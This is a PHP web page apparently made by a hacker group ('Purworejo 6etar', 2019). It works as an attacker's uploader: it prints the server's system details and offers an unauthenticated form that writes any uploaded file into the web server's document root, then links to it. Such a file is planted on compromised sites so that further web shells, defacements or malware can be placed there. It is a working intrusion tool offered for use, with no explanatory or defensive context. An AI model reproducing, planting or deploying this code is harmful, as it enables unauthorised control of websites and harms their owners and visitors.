<!DOCTYPE html>
<html>
<head>
<title>Uploader Purworejo 6etar</title>
</head>
<body>
<style>
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: lime;
	margin: 10px auto;
}
	background: black;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
}
</style>
<center>
<header>
	<pre> 
    ____                                       _     
   / __ \__  ________      ______  ________    (_)___ 
  / /_/ / / / / ___/ | /| / / __ \/ ___/ _ \  / / __ \
 / ____/ /_/ / /   | |/ |/ / /_/ / /  /  __/ / / /_/ /
/_/    \__,_/_/    |__/|__/\____/_/   \___/_/ /\____/ 
                                         /___/        
   _____      __            
  / ___/___  / /_____ ______
 / __ \/ _ \/ __/ __ `/ ___/
/ /_/ /  __/ /_/ /_/ / /    
\____/\___/\__/\__,_/_/     
    Contact me : Purworejo.6etar@gmail.com
</pre>
</header>
</center>
</body>
</html>
<?php
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <center><input type='file' name='idx_file'>
      <input type='submit' name='upload' value='upload'></center>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "sukses :) ==> 
            <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "gagal upload di document root.";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "sukses :)<b>$files</b> ada di folder ini";
        } else {
            echo "gagal :(";
        }
    }
}


?>
<html>
<head>
</head>
<body>
<br>
<br>
<center>
<font size="2">
<font color="silver"><a href='http://zaen-jr.blogspot.com/?m=1' target='_blank'>© 2019 Purworejo 6etar</font></font>
</center>
</body>
</html>